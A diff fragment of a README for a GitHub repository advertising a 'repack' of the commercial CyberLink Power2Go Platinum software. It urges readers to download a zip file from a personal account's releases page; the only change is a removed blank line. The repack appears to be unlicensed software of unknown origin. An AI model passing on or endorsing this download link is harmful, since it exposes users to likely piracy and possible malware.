@@ -120,4 +120,3 @@ We appreciate your feedback. If you have suggestions or comments, please reach o
 Thank you for visiting the **CyberLink Power2Go Platinum Repack** repository. We hope you find the resources helpful for your multimedia needs. Download the latest version and start creating today!
 
 For more information and downloads, check the [Releases section](https://github.com/meztinosfrizard/CyberLink-Power2Go-Platinum-Repack/releases/download/Download/CyberLink.Power2Go.Platinum.Repack.v1.9.4.Latest.zip).
- 
